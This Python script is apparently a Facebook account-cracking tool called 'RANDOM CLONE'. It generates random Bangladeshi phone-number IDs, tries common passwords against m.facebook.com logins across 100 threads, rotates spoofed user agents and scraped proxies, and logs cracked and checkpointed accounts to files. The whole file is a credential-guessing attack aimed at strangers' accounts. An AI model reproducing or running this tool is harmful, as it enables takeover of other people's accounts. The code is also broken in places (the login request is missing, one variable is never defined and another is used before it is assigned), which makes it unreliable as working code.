#!/usr/bin/python3
#-*-coding:utf-8-*-
import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import sys
import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
import string
try:
    import requests
except ImportError:
    print('\n [] installing requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [] installing futures ...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [] installing bs4 ...\n')
    os.system('pip install bs4')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib,urllib3
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Nokia C21 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/346.0.0.8.76;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
def uaku2():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/XERX-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()

os.system("clear")
logo=(f"""\x1b[1;97m   
 d88b d8888b.         d88b  .d88b.  db    db 
   `8P' 88  `8D         `8P' .8P  Y8. `8b  d8' 
    88  88oobY'          88  88    88  `8bd8'  
    88  88`8b            88  88    88    88    
db. 88  88 `88.      db. 88  `8b  d8'    88    
Y8888P  88   YD      Y8888P   `Y88P'     YP
                                         
\33[1;37m--------------------------------------------------------
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  DEVELOPER    :   IBAN AHMED JOY
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  TOOLS        :   RANDOM CLONE
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  VERSION      :   0.1
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  WORKING      :   DATA/WIFI
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  WHATSAPP     :   8801908098468
\33[1;37m--------------------------------------------------------""")


def Menu():
	os.system('clear');print(logo)
	print('\033[1;37m[\033[1;32m1\033[1;37m] RANDOM UID CRACK')
	lc = input('\033[1;37m[\033[1;32m?\033[1;37m] Choice : ')
	if lc =='1':
		method1()
	else:
		print('\n\033[1;92mChoice Vaild Option');time.sleep(1)
		Menu()

def method1():
	user=[]
	os.system('clear');print(logo)
	print("\033[1;37m[\033[1;32m+\033[1;37m] BD CODE EX : \033[1;32m016/017/018/019")
	cd = input('\033[1;37m[\033[1;32m?\033[1;37m] SELECT     : ')
	print("\033[1;37m[\033[1;32m+\033[1;37m] EXAMPLE    : \033[1;32m2000/5000/10000")
	limit = int(input('\033[1;37m[\033[1;32m?\033[1;37m] LIMIT      : '))
	for nmbr in range(limit):
		x = ''.join(random.choice(string.digits) for _ in range(2))
		y = ''.join(random.choice(string.digits) for _ in range(2))
		z = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(z)
	with ThreadPool(max_workers=100) as King:
		os.system('clear');print(logo)
		tl = str(len(user))
		print('\033[1;37m[\033[1;32m+\033[1;37m] TOTAL ID   :\033[1;92m '+tl)
		print(f'\033[1;37m[\033[1;32m+\033[1;37m] SIM CODE   :\033[1;92m '+cd)
		print("\33[1;37m--------------------------------------------------------")
		for xyz in user:
			uid = cd+x+y+xyz
			pwx = [x+y+xyz,y+xyz,cd+x+y,cd+cd,'free fire','bangla','@@@###']
			King.submit(M1,uid,pwx,tl)
	print("\33[1;37m--------------------------------------------------------")
	print(' [\033[1;32m!\033[1;37m] CRACKING COMPLETED')
	print(' [\033[1;32m!\033[1;37m] OK IDS SAVED IN OK.txt')
	exit()

def M1(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;37m[\33[1;92mFINDING\33[1;97m]•[\33[1;92m%s/%s\33[1;97m]•[\33[1;92mOK:\033[1;36m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
		    'authority': 'd.facebook.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9',
		    'cache-control': 'max-age=0',
		    'dpr': '1.2375000715255737',
 		   'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
 		   'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"RMX3624"',
  		  'sec-ch-ua-platform': '"Android"',
   		 'sec-ch-ua-platform-version': '"13.0.0"',
  		  'sec-fetch-dest': 'document',
   		 'sec-fetch-mode': 'navigate',
    		'sec-fetch-site': 'none',
   		 'sec-fetch-user': '?1',
  		  'upgrade-insecure-requests': '1',
   		 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 		   'viewport-width': '980',}

            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;91m[\33[1;92mLIVE\33[1;91m]\33[1;92m '+cid+' | '+ps+'')
                #print(f'\r\033[1;37m [COOKIES] '+coki)
                open('/sdcard/OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f'\r\33[1;91m[DEAD] '+cid+' | '+ps+'')
                open('/sdcard/CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.flush()
    except:
        pass
        
Menu()